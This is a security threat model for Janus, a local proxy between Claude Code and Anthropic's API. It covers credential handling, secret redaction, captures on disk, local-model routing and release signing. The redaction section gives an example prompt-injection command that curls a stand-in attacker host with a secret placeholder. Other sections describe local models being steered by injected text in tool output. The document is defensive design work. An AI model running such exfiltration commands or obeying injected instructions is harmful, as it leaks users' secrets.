# Threat model

What Janus protects, against whom, and what it does not. Written for 1.0
from a review of the code as it stands; each finding is marked as fixed,
accepted, or a limit to know about.

## What Janus is trusted with

Janus sits in the path of everything Claude Code sends and receives, so it
handles:

- **Your Anthropic credential**, in the headers of each request.
- **Your prompts, code, and tool output**, in request and response bodies.
- **Secrets that happen to be in those**, which the guard may be replacing.
- **Content you have marked local-only.**

It runs as you, on your machine, and has no privileges of its own.

## Who it defends against

| Adversary | In scope | What Janus does |
| --- | --- | --- |
| Anthropic seeing what you did not mean to send | Yes | The guard: detection, redaction, local-only policy, audit. |
| Another machine on your network | Yes | Listens on loopback only unless `allowRemote` is set. |
| A web page open in your browser | Yes | Refuses requests a page could have caused (below). |
| Someone on your network between Janus and LM Studio | Partly | See [The local model's connection](#the-local-models-connection). |
| Another user account on your machine | Partly | Files are private to you on macOS and Linux; the port is not. |
| A program running as you | No | It can read everything Janus can. Nothing here helps. |
| A local model that answers badly or maliciously | No | See [The local model's answers](#the-local-models-answers). |

## The listening port

Janus has no authentication of its own: it forwards whatever credential
the client sends. Anything that can reach the port can use it as a relay.

- **Other machines.** The default `listen` is loopback, and a non-loopback
  address is rejected at startup unless `allowRemote` is true. With
  `allowRemote`, anyone who can reach the port can spend the time of your
  local model and read nothing of yours, since they bring their own
  requests; but they could also be sent your local model's answers to
  their prompts. Do not set it on a network you do not control.
- **Web pages.** *Fixed in this review.* A page in your browser can send
  requests to `127.0.0.1`, and by pointing a name of its own at that
  address (DNS rebinding) could read the answers. Such a page has no
  Anthropic credential, so the exposure was your local model: any page
  could have made it work and read what it said. Janus now refuses a
  request whose `Host` is not this machine or whose `Origin` is a page
  from elsewhere, with a `403` and a line on the console. `allowRemote`
  turns the check off, because then other hosts are expected.
- **Other local users.** On a shared machine another account can connect
  to the port. They bring their own credential and get nothing of yours,
  but can use your local model, and their requests are written to your
  ledger and captures. Accepted: Janus is for a single-user machine.
- **The override header.** `X-Janus-Route` lets a client choose a backend.
  Anything that can reach the port can send it. It cannot send local-only
  content upstream; the policy outranks it.
- **Slow clients.** *Fixed in this review:* request headers must arrive
  within 30 seconds. Bodies and responses have no deadline, because a
  model's answer can take minutes.

## Credentials

- The credential is passed to the upstream and nowhere else. It is removed
  from requests to the local model, and from shadow runs and replays.
- It is never written to disk: the readable capture shows
  `authorization`, `x-api-key`, and `proxy-authorization` as `[redacted]`,
  and the raw capture files hold bodies only.
- **`upstream.baseUrl` decides who receives it.** Whoever can edit the
  config file, or set `JANUS_UPSTREAM_URL` in the environment Janus starts
  from, can redirect your credential. The config file is created private
  to you. An `http://` upstream is allowed, for testing against a local
  server, and would send the credential in the clear. `janus doctor`
  prints the upstream in use; check it says `https://api.anthropic.com`.

## Files on disk

Under `logging.dir`:

| File | Holds | Sensitivity |
| --- | --- | --- |
| Ledger | One line per request: sizes, tokens, timings, routes, guard counts, and the paths and markers that made content local-only. | Low. No content, no secrets. File names appear. |
| Captures | Every request and response in full. | High. Your prompts and code, any secrets in them, and local-only content, **as Claude Code sent them, before redaction**. |
| `redact.key`, with `guard.redact` on | The 32-byte key placeholders are made with. | Medium. With it, someone who already guesses a secret can check the guess against a placeholder. It reveals no secret by itself. |
| Originals, with `features.compress` on | The full output of each tool result Janus digested, for `tool_output` to return. | High. Command output, which can hold secrets. Never content the local-only policy covers, since that is never digested. |

- All are created private to you (`0600` in `0700` directories) on macOS
  and Linux. **Windows has no such modes**: files get the access their
  directory allows. Keep `logging.dir` under your user profile.
- Captures are pruned by age (7 days by default) and size; originals by
  age only. Originals are kept whether or not `logging.capture` is on,
  because a digest promises them. Pruning deletes files; it does not
  overwrite them.
- Redaction protects what goes to Anthropic, not what is on your disk. A
  capture of a redacted request holds the original beside what was sent.
  Set `logging.capture` to false if a week of prompts on disk is not
  acceptable, and note that `janus audit -verify` needs captures to work.
- Backups and sync tools that cover `logging.dir` will copy captures and
  originals.
- The transforms' memo of what each conversation has sent is kept in
  memory only, and is gone when Janus stops.

## Redaction and placeholders

- **Placeholders do not reveal the secret.** Each is an HMAC of the secret
  under a 32-byte random key, made once and kept in `<logging.dir>/redact.key`
  (owner-only). The same secret gets the same placeholder across restarts,
  so the prompt cache survives one. Without the key a placeholder can't be
  worked back to its secret, even by guessing; with it, a guess can be
  checked. A key file that is there but not a key stops Janus at start
  rather than being replaced.
- **Secrets stay in memory** for the life of the process, so that they can
  be put back. They are not written anywhere by the redactor.
- **Redaction fails closed.** A request that cannot be checked is not
  sent; after replacement the request is scanned again, and stopped if a
  known secret is still there; an answer naming a placeholder Janus cannot
  resolve is stopped rather than passed on.
- **It keeps secrets from Anthropic, not from tools.** Claude sees the
  placeholder and can use it: when it writes a command containing one,
  Janus puts the secret back before Claude Code runs it. That is the
  point, and it means a prompt injection that gets Claude to run
  `curl attacker.example/?k=<placeholder>` sends the real secret. Without
  redaction Claude would have held the secret itself, so this is no worse;
  but redaction is not a defence against prompt injection.
- **Detection is by pattern.** A secret in no known format, and with no
  telling name beside it, is not found. The entropy search finds more and
  is wrong more often. See [how well it works](GUARD.md#how-well-it-works).
- **Only request bodies are examined.** Not URLs, and not headers.

## Local-only policy

Covered in detail under
[what it does not cover](GUARD.md#what-it-does-not-cover). In short: it
follows tool calls and markers, not meaning, so content that arrives some
other way is not recognised; and under the `local` action the local
model's answer is ordinary text that can outlive the tool call that made
the conversation local.

## The local model's connection

Requests to LM Studio go over plain HTTP to `local.baseUrl`. Its default,
`http://studio.local:1234`, is a placeholder for the developer's own
machine; set it to yours, ideally `http://127.0.0.1:1234`, LM Studio on
the same machine.

- If LM Studio is on another machine, **everything routed to it crosses
  your network unencrypted**, including content the local-only policy
  kept from Anthropic, and, with `features.compress` on, every tool
  result sent to it to be digested.
- `.local` names are resolved by mDNS, which any machine on the network
  can answer. A hostile device could claim the name and receive those
  requests, and answer them.

Accepted, with this advice: on a network you do not fully trust, run LM
Studio on the same machine and set `local.baseUrl` to
`http://127.0.0.1:1234`, or use a fixed address. Janus checks that the
server at the address is LM Studio and has the model asked for; that
catches mistakes, not impersonation.

## The local model's answers

When a request is routed locally, Claude Code is told Claude answered, and
acts on it: a tool call in the answer is a tool call Claude Code will run,
under whatever permissions you have given it. The validators in
`local-then-escalate` check that an answer is well formed, not that it is
right or safe.

- A digest is the local model's text standing in for a tool result, and
  Claude reads it as one. A model steered by what it was digesting can
  put words there that Claude acts on. Digests are off by default.
- Use models you chose and downloaded yourself.
- A weaker model is easier to steer with text it reads in files and tool
  output. Route locally the work where that matters least, and keep
  Claude Code's permission prompts on for commands.

## Worker tools (`janus mcp`)

- `ask_files` reads only inside its root, which is the directory it was
  started in unless `-root` says otherwise. Paths are resolved through
  symbolic links before the check, so a link inside the root cannot lead
  out of it.
- It reads at most 60 files and 1 MB per call, and skips binary files.
- What it reads goes to the local model and not upstream. **Its answer
  goes to Claude**, and can quote what it read. If the local-only policy
  protects a path and the call names that path, the answer is withheld
  like any other tool result; a call that reaches the file by a glob the
  policy does not recognise is not caught.
- `tool_output` returns originals of digested tool results. It takes an
  id of 16 hex digits and nothing else, so it cannot be pointed at a
  path, and it returns at most about 60 kB per call.
- The MCP server is a separate process from the proxy. It works whether
  or not Claude Code is pointed at Janus, and when it is not, nothing the
  guard does applies to its answers.

## What Janus adds to requests

Janus changes a request only in ways it records: the model name for a
local route, repairs for a mixed history, placeholders, withheld content,
and digests of large tool results. Each is named in the ledger, and `janus audit` shows them. It
narrows `Accept-Encoding` to gzip on Messages requests so that it can read
the response. It adds no identifying header to what it sends upstream.

## Supply chain

- Janus asks GitHub for its list of releases when, and only when,
  `janus version -check` or `janus doctor` runs, or, with `update.check`
  on, once a day when the proxy starts: one request to `api.github.com`
  with `janus/<version>` as its User-Agent, and nothing about you, your
  config, or your traffic. With `update.check` off, the default, the
  proxy never makes it.

- Janus uses the Go standard library and nothing else, by
  [decision](adr/001-dependencies.md). There are no third-party modules to
  compromise.
- Release binaries are built by GitHub Actions from the tagged commit, and
  each archive carries a signed build-provenance attestation: a statement,
  recorded with GitHub, that this repository's release workflow built it
  from that commit. Check one with
  `gh attestation verify <archive> --repo risadams/Janus`. That catches a
  replaced release, which `checksums.txt` alone cannot.
- `checksums.txt` is also signed, with an ed25519 key held as an Actions
  secret whose public half is compiled into Janus, so a download can be
  checked without the GitHub CLI and without trusting the release page
  ([ADR-003](adr/003-signed-checksums.md)). The signature proves less than
  the attestation: that the key's holder signed the sums, not how the
  archives were built. SECURITY.md says how to check it by hand.
- **The binaries themselves are not code-signed**, so macOS quarantines a
  copy downloaded in a browser. Build from source if you would rather not
  trust a release at all.

## Review findings

| Finding | Outcome |
| --- | --- |
| A web page could use the local model through the loopback port, and read its answers by DNS rebinding | Fixed: `Host` and `Origin` are checked unless `allowRemote` is set |
| No deadline on request headers | Fixed: 30 seconds |
| `janus doctor` treated a port in use as a failure on Windows | Fixed (found by running the tests there) |
| File modes do nothing on Windows | Limit, documented |
| Captures hold secrets and local-only content from before redaction | Limit, documented; captures can be switched off |
| Traffic to LM Studio is unencrypted and `.local` names can be spoofed | Limit, documented with advice |
| A local model's tool calls are run as if Claude made them | Limit, inherent to routing locally |
| Redaction does not stop a prompt injection from using a placeholder | Limit, inherent to reversible redaction |
| `http://` upstream sends the credential in the clear | Limit; allowed for testing |
| Release binaries are unsigned | Limit |

## Reporting a problem

Report a security problem privately, as [SECURITY.md](../SECURITY.md)
describes. Anything else goes in an issue at
<https://github.com/risadams/Janus/issues>.
